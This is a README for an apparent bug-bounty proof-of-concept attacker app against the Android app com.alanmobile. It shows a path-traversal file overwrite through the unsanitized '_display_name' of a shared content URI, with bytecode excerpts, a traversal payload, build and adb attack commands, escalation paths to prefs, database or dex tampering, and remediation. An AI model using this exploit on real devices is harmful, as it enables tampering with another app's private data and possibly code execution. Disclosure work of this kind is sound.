# com.alanmobile - Dirty Stream (Path Traversal via shared content URI)

Zero-click arbitrary file **overwrite** inside `com.alanmobile`'s private internal
storage, reachable by any installed app through the exported share activity. This
project is the attacker app that demonstrates it.

---

## 1. The vulnerability (confirmed from bytecode)

Exported entry, no permission required, fired by any app:

```xml
<activity android:name="com.alaneu.reactnativeshareextension.share.ShareReceiverActivity"
          android:exported="true" android:launchMode="2">
    <intent-filter>
        <action android:name="android.intent.action.SEND"/>
        ...
```

The activity derives the destination file name from the **incoming content URI's
`_display_name`, completely unsanitized**:

```
# ShareReceiverActivity.b(Landroid/net/Uri;)Ljava/lang/String;
query(uri, ...) -> Cursor
idx = cursor.getColumnIndex("_display_name")
name = cursor.getString(idx)        // RAW. no File.getName(), no basename, no ".." check
return name
```

and writes the attacker's stream straight into a path built from it:

```
# ShareReceiverActivity.f(Landroid/net/Uri;)Lorg/json/JSONObject;
name = b(uri)                                   // attacker-controlled, else "shared-<UUID>"
dir  = new File(getCacheDir(), "shared")        // /data/data/com.alanmobile/cache/shared
dst  = new File(dir, name)                      // <-- traversal happens here
in   = getContentResolver().openInputStream(uri)
out  = new FileOutputStream(dst)
kotlin.io.copyTo(in, out)                        // <-- attacker bytes written to dst
```

There is no canonicalization or `startsWith` containment check anywhere between the
`_display_name` read and the `FileOutputStream`. The JSON returned to React Native
reports `dst.getName()` (a cosmetic basename), but the **write to the traversed path
has already happened**.

### Traversal math
`getCacheDir()` is `/data/data/com.alanmobile/cache`, so `cache/shared/` is two
levels under the data root:

```
_display_name = "../../PWNED_by_actuator.txt"
literal path  = /data/data/com.alanmobile/cache/shared/../../PWNED_by_actuator.txt
resolves to   = /data/data/com.alanmobile/PWNED_by_actuator.txt
```

A file owned by the victim's UID, inside its private data directory, written from
attacker-supplied bytes. The attacker app has no permission to create it directly.

---

## 2. How this PoC works

- `EvilProvider` - a content provider whose `query()` returns `_display_name =
  "../../PWNED_by_actuator.txt"` and whose `openFile()` returns our payload bytes.
- `MainActivity` - fires an **explicit** `Intent(ACTION_SEND)` at
  `com.alanmobile/...ShareReceiverActivity` with `EXTRA_STREAM` = our content URI and
  `FLAG_GRANT_READ_URI_PERMISSION`. Explicit component targeting means the victim's
  intent-filter mime constraints are irrelevant; the grant + `ClipData` guarantees the
  victim can read our URI whether it reads `EXTRA_STREAM` or `getData()`.

---

## 3. Build

Either open the folder in Android Studio and let it sync, or from the project root:

```
gradlew assembleDebug          # Windows
./gradlew assembleDebug        # macOS/Linux
```

APK lands at `app/build/outputs/apk/debug/app-debug.apk`.
(JDK 17+ required; Android Studio's bundled JBR works.)

---

## 4. Run the demo

Use an **emulator** (any non-Google-Play AVD gives root via `adb root`) or a rooted
device, so the planted file is directly observable.

```
# 1. install the victim (base + splits from the XAPK)
adb install-multiple com.alanmobile.apk config.*.apk

# 2. install this PoC
adb install -r app/build/outputs/apk/debug/app-debug.apk

# 3. run the attack (headless), or open "DirtyStream PoC" and tap the button
adb shell am start -n sh.actuator.dirtystreampoc/.MainActivity --ez auto true
```

### Verify

```
adb root
adb shell ls -l  /data/data/com.alanmobile/PWNED_by_actuator.txt
adb shell cat    /data/data/com.alanmobile/PWNED_by_actuator.txt
```

The file exists, owned by the victim's UID, containing our payload. `demo.ps1`
automates the before/after (Windows).

---

## 5. mp4 capture for the writeup

Goal: one continuous clip showing the file **absent**, the tap, then the file
**present** in the victim's private dir.

1. Mirror the device and record the desktop so both the screen and a terminal are
   visible:
   ```
   scrcpy                          # mirror device
   ```
   and record the desktop with OBS / the OS screen recorder. (Or use Android Studio:
   Logcat panel -> screen-record button for device-only capture, then splice the
   terminal proof.)
2. Storyboard:
   - Terminal: `adb root; adb shell ls /data/data/com.alanmobile/` -> no PWNED file.
   - Device: open **DirtyStream PoC**, tap **FIRE**. The on-screen text shows the
     traversal name and resolved path.
   - Terminal: `adb shell ls -l /data/data/com.alanmobile/PWNED_by_actuator.txt`
     then `adb shell cat ...` -> the planted attacker file.
3. Device-only alternative:
   ```
   adb shell screenrecord /sdcard/poc.mp4      # Ctrl+C to stop
   adb pull /sdcard/poc.mp4
   ```

---

## 6. Impact / severity

- **Primitive:** zero-click, unauthenticated (any installed app, no permissions),
  arbitrary **file overwrite** within the victim's private internal data dir via
  `../` traversal of an attacker-controlled `_display_name`.
- **Bounded:** destination is `getCacheDir()` (internal), so the write stays inside
  `/data/data/com.alanmobile/`. It cannot reach other apps or external storage. It can
  overwrite the victim's own `databases/`, `shared_prefs/`, `files/`, webview data, or
  a writable code/dex cache.
- **Escalation:** point `TRAVERSAL_NAME` at a file the app trusts or loads:
  - `"../../shared_prefs/<name>.xml"` -> tamper auth/session/feature state
  - `"../../databases/<existing>.db"` -> corrupt/replace a trusted DB
  - a writable loaded library / cached dex -> code execution in the victim's context
- **Suggested rating:** Dirty Stream of this class typically lands **P3 baseline**,
  **P2** with a demonstrated state-tamper or code-exec chain. CVSS ~ AV:L/AC:L/PR:N/
  UI:N/S:U/C:N/I:H/A:L (~6.1), higher if you chain to RCE (S:C).

Do not overclaim external/cross-app impact - it is internal-only. The strength of the
report is the zero-click reachability + the clean unsanitized primitive; the severity
tier you argue should match the concrete consequence you actually demonstrate.

---

## 7. Remediation (for the report)

Reduce the incoming name to its last path segment before use, e.g.
`new File(dir, new File(displayName).getName())`, and reject the result if it still
contains a separator; or write under a generated name (the existing `shared-<UUID>`
fallback) and never trust `_display_name` for the on-disk path.
